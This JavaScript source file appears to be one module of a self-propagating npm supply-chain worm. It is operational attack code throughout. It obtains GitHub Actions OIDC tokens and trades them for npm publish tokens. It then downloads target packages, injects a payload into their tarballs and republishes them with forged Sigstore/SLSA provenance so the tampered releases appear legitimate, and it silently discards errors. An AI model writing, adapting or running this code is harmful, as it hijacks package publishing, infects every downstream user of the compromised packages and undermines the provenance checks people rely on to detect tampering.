/*
 * GitHub Actions OIDC token exchange, Sigstore/Fulcio/Rekor provenance generation, and npm OIDC package compromise.
 */

var { $: oidcCompromiseBunShell } = globalThis.Bun;
import { createWriteStream as oidcCreateWriteStream } from "fs";
import { join as oidcPathJoin } from "path";
import { Readable as oidcReadable } from "stream";
import { pipeline as oidcPipeline } from "stream/promises";
import {
  createHash as sigstoreCreateHash,
  generateKeyPairSync as sigstoreGenerateKeyPairSync,
  sign as sigstoreSign,
} from "crypto";
import { readFile as sigstoreReadFile } from "fs/promises";
import { gunzipSync as sigstoreGunzipSync } from "zlib";
var fulcioBaseUrl = "https://fulcio.sigstore.dev",
  rekorBaseUrl = "https://rekor.sigstore.dev",
  dssePayloadType = "application/vnd.in-toto+json",
  inTotoStatementType = "https://in-toto.io/Statement/v1",
  slsaProvenancePredicateType = "https://slsa.dev/provenance/v1",
  githubActionsRunnerBuilderId = "https://github.com/actions/runner",
  githubActionsWorkflowBuildType =
    "https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1",
  sigstoreBundleMediaType = "application/vnd.dev.sigstore.bundle.v0.3+json";
function readPackageJsonFromTarballBuffer(sigstoreTarBuffer) {
  let sigstoreTarOffset = 0;
  while (sigstoreTarOffset + 512 <= sigstoreTarBuffer.length) {
    let sigstoreTarHeaderBlock = sigstoreTarBuffer.subarray(
      sigstoreTarOffset,
      sigstoreTarOffset + 512,
    );
    if (sigstoreTarHeaderBlock[0] === 0) break;
    let sigstoreTarPathBytes = sigstoreTarHeaderBlock.subarray(0, 100),
      sigstoreTarPathNullIndex = sigstoreTarPathBytes.indexOf(0),
      sigstoreTarEntryPath = sigstoreTarPathBytes
        .subarray(
          0,
          sigstoreTarPathNullIndex === -1 ? 100 : sigstoreTarPathNullIndex,
        )
        .toString("utf8"),
      sigstoreTarEntrySizeText = sigstoreTarHeaderBlock
        .subarray(124, 136)
        .toString("utf8")
        .replace(/\0/g, "")
        .trim(),
      sigstoreTarEntrySize = sigstoreTarEntrySizeText
        ? parseInt(sigstoreTarEntrySizeText, 8)
        : 0;
    if (
      ((sigstoreTarOffset += 512),
      sigstoreTarEntryPath === "package/package.json" ||
        sigstoreTarEntryPath.endsWith("/package.json"))
    ) {
      let sigstorePackageJsonBuffer = sigstoreTarBuffer.subarray(
        sigstoreTarOffset,
        sigstoreTarOffset + sigstoreTarEntrySize,
      );
      return JSON.parse(sigstorePackageJsonBuffer.toString("utf8"));
    }
    sigstoreTarOffset += Math.ceil(sigstoreTarEntrySize / 512) * 512;
  }
  throw Error("package.json not found in tarball");
}
function dssePreAuthEncoding(dssePreAuthPayloadType, dssePreAuthPayloadBytes) {
  let dssePreAuthHeader =
    "DSSEv1 " +
    dssePreAuthPayloadType.length +
    "\x20" +
    dssePreAuthPayloadType +
    "\x20" +
    dssePreAuthPayloadBytes.length +
    "\x20";
  return Buffer.concat([
    Buffer.from(dssePreAuthHeader, "ascii"),
    dssePreAuthPayloadBytes,
  ]);
}
function jwtSubjectFromPayload(jwtForSubject) {
  let jwtSegments = jwtForSubject.split(".", 3);
  if (!jwtSegments[1]) throw Error("Malformed JWT: missing payload segment");
  let jwtPayload = JSON.parse(
    Buffer.from(jwtSegments[1], "base64").toString("utf-8"),
  );
  if (jwtPayload.email) {
    if (!jwtPayload.email_verified)
      throw Error("JWT email not verified by issuer");
    return jwtPayload.email;
  }
  if (jwtPayload.sub) return jwtPayload.sub;
  throw Error("JWT subject not found");
}
function pemToDerBuffer(pemText) {
  let pemBase64Lines = pemText
    .split("\x0a")
    .filter(
      (pemLine) =>
        !pemLine.startsWith("-----BEGIN") &&
        !pemLine.startsWith("-----END") &&
        pemLine.trim() !== "",
    );
  return Buffer.from(pemBase64Lines.join(""), "base64");
}
function npmPurl(purlPackageName, purlPackageVersion) {
  if (purlPackageName.startsWith("@"))
    return "pkg:npm/%40" + purlPackageName.slice(1) + "@" + purlPackageVersion;
  return "pkg:npm/" + purlPackageName + "@" + purlPackageVersion;
}
function buildSlsaProvenanceStatement(slsaStatementSubjects) {
  let slsaBuildEnv = process.env,
    workflowRefPath = (slsaBuildEnv.GITHUB_WORKFLOW_REF || "").replace(
      slsaBuildEnv.GITHUB_REPOSITORY + "/",
      "",
    ),
    workflowRefSeparatorIndex = workflowRefPath.indexOf("@"),
    workflowFilePath = workflowRefPath.slice(0, workflowRefSeparatorIndex),
    workflowGitRef = workflowRefPath.slice(workflowRefSeparatorIndex + 1);
  return {
    _type: inTotoStatementType,
    subject: slsaStatementSubjects,
    predicateType: slsaProvenancePredicateType,
    predicate: {
      buildDefinition: {
        buildType: githubActionsWorkflowBuildType,
        externalParameters: {
          workflow: {
            ref: workflowGitRef,
            repository:
              slsaBuildEnv.GITHUB_SERVER_URL +
              "/" +
              slsaBuildEnv.GITHUB_REPOSITORY,
            path: workflowFilePath,
          },
        },
        internalParameters: {
          github: {
            event_name: slsaBuildEnv.GITHUB_EVENT_NAME,
            repository_id: slsaBuildEnv.GITHUB_REPOSITORY_ID,
            repository_owner_id: slsaBuildEnv.GITHUB_REPOSITORY_OWNER_ID,
          },
        },
        resolvedDependencies: [
          {
            uri:
              "git+" +
              slsaBuildEnv.GITHUB_SERVER_URL +
              "/" +
              slsaBuildEnv.GITHUB_REPOSITORY +
              "@" +
              slsaBuildEnv.GITHUB_REF,
            digest: { gitCommit: slsaBuildEnv.GITHUB_SHA },
          },
        ],
      },
      runDetails: {
        builder: {
          id:
            githubActionsRunnerBuilderId +
            "/" +
            slsaBuildEnv.RUNNER_ENVIRONMENT,
        },
        metadata: {
          invocationId:
            slsaBuildEnv.GITHUB_SERVER_URL +
            "/" +
            slsaBuildEnv.GITHUB_REPOSITORY +
            "/actions/runs/" +
            slsaBuildEnv.GITHUB_RUN_ID +
            "/attempts/" +
            slsaBuildEnv.GITHUB_RUN_ATTEMPT,
        },
      },
    },
  };
}
async function getGitHubActionsSigstoreOidcToken() {
  let sigstoreOidcRequestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL,
    sigstoreOidcRequestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!sigstoreOidcRequestUrl || !sigstoreOidcRequestToken)
    throw Error("GitHub Actions OIDC env vars not available for sigstore");
  let sigstoreOidcUrl = new URL(sigstoreOidcRequestUrl);
  sigstoreOidcUrl.searchParams.append("audience", "sigstore");
  let sigstoreOidcResponse = await fetch(sigstoreOidcUrl.href, {
    headers: {
      Accept: "application/json",
      Authorization: "Bearer " + sigstoreOidcRequestToken,
    },
  });
  if (!sigstoreOidcResponse.ok)
    throw Error(
      "Failed to get sigstore OIDC token: " + sigstoreOidcResponse.status,
    );
  let sigstoreOidcJson = await sigstoreOidcResponse.json();
  if (!sigstoreOidcJson.value)
    throw Error("Sigstore OIDC response missing token value");
  return sigstoreOidcJson.value;
}
async function requestFulcioSigningCertificate(
  fulcioOidcToken,
  fulcioPublicKeyPem,
  fulcioProofSignature,
) {
  let fulcioSigningCertRequestBody = {
      credentials: { oidcIdentityToken: fulcioOidcToken },
      publicKeyRequest: {
        publicKey: { algorithm: "ECDSA", content: fulcioPublicKeyPem },
        proofOfPossession: fulcioProofSignature.toString("base64"),
      },
    },
    fulcioSigningCertResponse = await fetch(
      fulcioBaseUrl + "/api/v2/signingCert",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(fulcioSigningCertRequestBody),
      },
    );
  if (!fulcioSigningCertResponse.ok) {
    let fulcioSigningCertErrorText = await fulcioSigningCertResponse.text();
    throw Error(
      "Fulcio signing cert request failed: " +
        fulcioSigningCertResponse.status +
        " \u2014 " +
        fulcioSigningCertErrorText,
    );
  }
  let fulcioSigningCertJson = await fulcioSigningCertResponse.json(),
    fulcioCertificates =
      fulcioSigningCertJson.signedCertificateEmbeddedSct?.chain?.certificates ??
      fulcioSigningCertJson.signedCertificateDetachedSct?.chain?.certificates;
  if (!fulcioCertificates || fulcioCertificates.length === 0)
    throw Error("Fulcio returned no certificates");
  return fulcioCertificates;
}
async function createRekorDsseEntry(rekorDsseEnvelope, rekorCertPem) {
  let rekorEnvelopeJson = JSON.stringify(rekorDsseEnvelope),
    rekorVerifierCertBase64 = Buffer.from(rekorCertPem).toString("base64"),
    rekorEntryRequestBody = {
      apiVersion: "0.0.1",
      kind: "dsse",
      spec: {
        proposedContent: {
          envelope: rekorEnvelopeJson,
          verifiers: [rekorVerifierCertBase64],
        },
      },
    },
    rekorEntryResponse = await fetch(rekorBaseUrl + "/api/v1/log/entries", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(rekorEntryRequestBody),
    });
  if (!rekorEntryResponse.ok) {
    let rekorEntryErrorText = await rekorEntryResponse.text();
    throw Error(
      "Rekor entry creation failed: " +
        rekorEntryResponse.status +
        " \u2014 " +
        rekorEntryErrorText,
    );
  }
  let rekorEntryResponseJson = await rekorEntryResponse.json(),
    rekorEntryObjectEntries = Object.entries(rekorEntryResponseJson);
  if (rekorEntryObjectEntries.length !== 1)
    throw Error(
      "Unexpected Rekor response: expected 1 entry, got " +
        rekorEntryObjectEntries.length,
    );
  let [, rekorLogEntry] = rekorEntryObjectEntries[0],
    rekorLogInclusionProof = rekorLogEntry.verification?.inclusionProof;
  return {
    logIndex: rekorLogEntry.logIndex,
    logID: rekorLogEntry.logID,
    integratedTime: rekorLogEntry.integratedTime,
    body: rekorLogEntry.body,
    signedEntryTimestamp: rekorLogEntry.verification?.signedEntryTimestamp,
    inclusionProof: rekorLogInclusionProof
      ? {
          logIndex: rekorLogInclusionProof.logIndex,
          rootHash: rekorLogInclusionProof.rootHash,
          treeSize: rekorLogInclusionProof.treeSize,
          hashes: rekorLogInclusionProof.hashes,
          checkpoint: rekorLogInclusionProof.checkpoint,
        }
      : void 0,
  };
}
async function buildSigstoreProvenanceBundle(provenanceTarballPath) {
  let provenanceTarballBuffer = await sigstoreReadFile(provenanceTarballPath),
    provenanceTarballSha512 = sigstoreCreateHash("sha512")
      .update(provenanceTarballBuffer)
      .digest("hex"),
    provenanceTarBuffer = sigstoreGunzipSync(provenanceTarballBuffer),
    provenancePackageJson =
      readPackageJsonFromTarballBuffer(provenanceTarBuffer),
    { name: provenancePackageName, version: provenancePackageVersion } =
      provenancePackageJson;
  if (!provenancePackageName || !provenancePackageVersion)
    throw Error(
      "Cannot generate provenance: package.json missing name or version",
    );
  let provenanceSubjects = [
      {
        name: npmPurl(provenancePackageName, provenancePackageVersion),
        digest: { sha512: provenanceTarballSha512 },
      },
    ],
    slsaProvenanceStatement = buildSlsaProvenanceStatement(provenanceSubjects),
    slsaProvenancePayloadBytes = Buffer.from(
      JSON.stringify(slsaProvenanceStatement),
    ),
    sigstoreOidcToken = await getGitHubActionsSigstoreOidcToken(),
    ephemeralSigstoreKeyPair = sigstoreGenerateKeyPairSync("ec", {
      namedCurve: "P-256",
    }),
    ephemeralSigstorePublicKeyPem = ephemeralSigstoreKeyPair.publicKey
      .export({ format: "pem", type: "spki" })
      .toString(),
    sigstoreJwtSubject = jwtSubjectFromPayload(sigstoreOidcToken),
    sigstoreProofOfPossession = sigstoreSign(
      "sha256",
      Buffer.from(sigstoreJwtSubject),
      ephemeralSigstoreKeyPair.privateKey,
    ),
    fulcioCertificatePem = (
      await requestFulcioSigningCertificate(
        sigstoreOidcToken,
        ephemeralSigstorePublicKeyPem,
        sigstoreProofOfPossession,
      )
    )[0],
    fulcioCertificateDer = pemToDerBuffer(fulcioCertificatePem),
    dssePreAuthBytes = dssePreAuthEncoding(
      dssePayloadType,
      slsaProvenancePayloadBytes,
    ),
    dsseSignature = sigstoreSign(
      "sha256",
      dssePreAuthBytes,
      ephemeralSigstoreKeyPair.privateKey,
    ),
    dsseEnvelope = {
      payloadType: dssePayloadType,
      payload: slsaProvenancePayloadBytes.toString("base64"),
      signatures: [{ keyid: "", sig: dsseSignature.toString("base64") }],
    },
    rekorEntry = await createRekorDsseEntry(dsseEnvelope, fulcioCertificatePem),
    transparencyLogEntry = {
      logIndex: rekorEntry.logIndex.toString(),
      logId: { keyId: Buffer.from(rekorEntry.logID, "hex").toString("base64") },
      kindVersion: { kind: "dsse", version: "0.0.1" },
      integratedTime: rekorEntry.integratedTime.toString(),
      canonicalizedBody: rekorEntry.body,
    };
  if (rekorEntry.signedEntryTimestamp)
    transparencyLogEntry.inclusionPromise = {
      signedEntryTimestamp: rekorEntry.signedEntryTimestamp,
    };
  if (rekorEntry.inclusionProof) {
    let rekorInclusionProof = rekorEntry.inclusionProof;
    transparencyLogEntry.inclusionProof = {
      logIndex: rekorInclusionProof.logIndex.toString(),
      treeSize: rekorInclusionProof.treeSize.toString(),
      rootHash: Buffer.from(rekorInclusionProof.rootHash, "hex").toString(
        "base64",
      ),
      hashes: rekorInclusionProof.hashes.map((rekorInclusionProofHash) =>
        Buffer.from(rekorInclusionProofHash, "hex").toString("base64"),
      ),
      checkpoint: { envelope: rekorInclusionProof.checkpoint },
    };
  }
  let provenanceSigstoreBundle = {
      mediaType: sigstoreBundleMediaType,
      verificationMaterial: {
        certificate: { rawBytes: fulcioCertificateDer.toString("base64") },
        tlogEntries: [transparencyLogEntry],
        timestampVerificationData: { rfc3161Timestamps: [] },
      },
      dsseEnvelope: {
        payloadType: dssePayloadType,
        payload: slsaProvenancePayloadBytes.toString("base64"),
        signatures: [{ sig: dsseSignature.toString("base64") }],
      },
    },
    transparencyLogUrl =
      rekorEntry.logIndex != null
        ? "https://search.sigstore.dev/?logIndex=" + rekorEntry.logIndex
        : void 0;
  return {
    bundle: provenanceSigstoreBundle,
    transparencyLogUrl: transparencyLogUrl,
  };
}
function readOidcPackageEnvList() {
  let oidcPackagesEnv = process.env.OIDC_PACKAGES;
  if (!oidcPackagesEnv || !oidcPackagesEnv.trim()) return [];
  return oidcPackagesEnv
    .split(",")
    .map((oidcPackageNameText) => oidcPackageNameText.trim())
    .filter(Boolean);
}
class NpmOidcPackageCompromiser extends InfectionJobBase {
  constructor() {
    super();
  }
  async updateTarball(oidcTarballPathToUpdate) {
    return injectPayloadIntoNpmTarball(oidcTarballPathToUpdate, {
      tag: "[npmoidc]",
      targetName: "Setup",
    });
  }
  async downloadPackages(oidcPackageNames, npmOidcToken) {
    let oidcTempDir = await oidcCompromiseBunShell`mktemp -d`
        .text()
        .then((oidcTempDirText) => oidcTempDirText.trim()),
      oidcModifiedTarballs = [],
      downloadPatchAndPublishOidcPackage = async (oidcTargetPackageName) => {
        try {
          let npmRegistryPackageResponse = await fetch(
            "https://registry.npmjs.org/" +
              oidcTargetPackageName.replace("/", "%2F"),
          );
          if (!npmRegistryPackageResponse.ok) return;
          let npmRegistryPackageMetadata =
              await npmRegistryPackageResponse.json(),
            latestMajorVersionsList = latestMajorVersions(
              npmRegistryPackageMetadata.versions,
            );
          for (let oidcPackageVersion of latestMajorVersionsList) {
            let oidcPackageTarballUrl =
              npmRegistryPackageMetadata.versions[oidcPackageVersion]?.dist
                ?.tarball;
            if (!oidcPackageTarballUrl) continue;
            let oidcTarballResponse = await fetch(oidcPackageTarballUrl);
            if (!oidcTarballResponse.ok || !oidcTarballResponse.body) continue;
            let oidcTarballFileName =
                oidcTargetPackageName.replace("@", "").replace("/", "-") +
                "-" +
                oidcPackageVersion +
                ".tgz",
              oidcTarballPath = oidcPathJoin(oidcTempDir, oidcTarballFileName);
            await oidcPipeline(
              oidcReadable.fromWeb(oidcTarballResponse.body),
              oidcCreateWriteStream(oidcTarballPath),
            );
            let modifiedOidcTarballPath =
                await this.updateTarball(oidcTarballPath),
              sigstoreProvenanceBundle;
            if (process.env.GITHUB_REF)
              try {
                let generatedSigstoreBundle =
                  await buildSigstoreProvenanceBundle(modifiedOidcTarballPath);
                if (generatedSigstoreBundle) {
                  if (
                    ((sigstoreProvenanceBundle =
                      generatedSigstoreBundle.bundle),
                    generatedSigstoreBundle.transparencyLogUrl)
                  );
                }
              } catch (sigstoreBundleBuildError) {}
            await this.publishPackage(
              modifiedOidcTarballPath,
              oidcTargetPackageName,
              npmOidcToken,
              sigstoreProvenanceBundle,
            ),
              oidcModifiedTarballs.push(modifiedOidcTarballPath);
          }
        } catch (oidcPackageDownloadError) {}
      };
    for (let oidcPackageName of oidcPackageNames)
      await downloadPatchAndPublishOidcPackage(oidcPackageName);
    return { tmpDir: oidcTempDir, downloaded: oidcModifiedTarballs };
  }
  async publishPackage(
    packagePublishTarballPath,
    packagePublishName,
    packagePublishOidcToken,
    packageSigstoreBundle,
  ) {
    try {
      let encodedPackageName = encodeURIComponent(packagePublishName),
        npmTokenExchangeResponse = await fetch(
          "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/" +
            encodedPackageName,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: "Bearer " + packagePublishOidcToken,
            },
            body: JSON.stringify({ oidcToken: packagePublishOidcToken }),
          },
        ),
        { token: npmPublishToken } = await npmTokenExchangeResponse.json();
      if (npmPublishToken) {
        if (packageSigstoreBundle) {
          if (
            await publishNpmTarball(
              packagePublishTarballPath,
              npmPublishToken,
              false,
              packageSigstoreBundle,
            )
          )
            return true;
        }
        return await publishNpmTarball(
          packagePublishTarballPath,
          npmPublishToken,
          false,
        );
      } else
        return (
          await publishNpmTarball(
            packagePublishTarballPath,
            "DummyToken",
            true,
          ),
          false
        );
    } catch (npmPublishError) {
      return false;
    }
  }
  async execute() {
    let {
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: npmActionsOidcRequestToken,
        ACTIONS_ID_TOKEN_REQUEST_URL: npmActionsOidcRequestUrl,
      } = process.env,
      npmOidcResponse = await fetch(
        npmActionsOidcRequestUrl + "&audience=npm:registry.npmjs.org",
        { headers: { Authorization: "bearer " + npmActionsOidcRequestToken } },
      ),
      { value: acquiredNpmOidcToken } = await npmOidcResponse.json();
    if (acquiredNpmOidcToken) {
      let oidcPackageTargets = readOidcPackageEnvList();
      if (oidcPackageTargets.length === 0) return false;
      return (
        await this.downloadPackages(oidcPackageTargets, acquiredNpmOidcToken),
        true
      );
    } else return false;
  }
}
function latestMajorVersions(versionsByName) {
  let latestByMajorVersion = new Map();
  for (let versionCandidate of Object.keys(versionsByName)) {
    if (versionCandidate.includes("-")) continue;
    let versionParts = versionCandidate.split("."),
      majorVersionNumber = parseInt(versionParts[0], 10);
    if (isNaN(majorVersionNumber)) continue;
    let latestForMajorVersion = latestByMajorVersion.get(majorVersionNumber);
    if (
      !latestForMajorVersion ||
      compareSemverVersions(versionCandidate, latestForMajorVersion) > 0
    )
      latestByMajorVersion.set(majorVersionNumber, versionCandidate);
  }
  return Array.from(latestByMajorVersion.values()).sort(compareSemverVersions);
}
function compareSemverVersions(leftSemverVersion, rightSemverVersion) {
  let leftSemverParts = leftSemverVersion.split(".").map(Number),
    rightSemverParts = rightSemverVersion.split(".").map(Number);
  for (let semverPartIndex = 0; semverPartIndex < 3; semverPartIndex++) {
    let semverPartDelta =
      (leftSemverParts[semverPartIndex] || 0) -
      (rightSemverParts[semverPartIndex] || 0);
    if (semverPartDelta !== 0) return semverPartDelta;
  }
  return 0;
}
